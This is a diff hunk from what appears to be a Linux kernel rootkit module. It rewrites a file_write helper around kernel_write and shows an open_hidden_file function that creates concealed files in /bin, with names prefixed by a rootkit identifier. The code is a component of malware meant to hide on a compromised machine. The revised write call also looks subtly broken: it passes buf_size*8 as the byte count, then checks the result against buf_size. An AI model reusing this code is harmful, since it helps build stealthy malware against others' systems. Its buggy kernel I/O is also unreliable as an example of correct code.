@@ -45,15 +45,18 @@ static int file_read(struct kern_file *file, void *buf){ //reads data from file
 	return 0; //returns size of file
 }
 
-static int file_write(struct kern_file *file, void *buf){ //writes data to file
-	printk(KERN_DEBUG "in file write\n");
+static int file_write(struct kern_file *file, void *buf, int buf_size){ //writes data to file
 	//code from https://stackoverflow.com/questions/69633382/using-kernel-read-kernel-write-to-read-input-txts-content-write-it-into-out
 	file->pos = 0;
-	printk(KERN_DEBUG "writing %s\n", (char *) buf);
-	kernel_write(file->fd, buf, file->count, &(file->pos));
-	return 0;
-}
 
+	file->ret = kernel_write(file->fd, buf, buf_size*8, &(file->pos)); //writes data to file
+	if (file->ret!=buf_size){ //not written everything
+		printk(KERN_DEBUG "[rootkit] kernel_write- unable to write %i bytes", buf_size-file->ret);
+		return buf_size-file->ret; //returns number of bytes not written
+	}
+	return 0;
+
+}
 
 static struct kern_file *open_hidden_file(char *filename){ //opens file in /bin prepended with ROOTKIT_ID or creates if doesn't exist
 	printk(KERN_DEBUG "[open_hidden_file] in open_hidden_file- file = %s\n", filename);
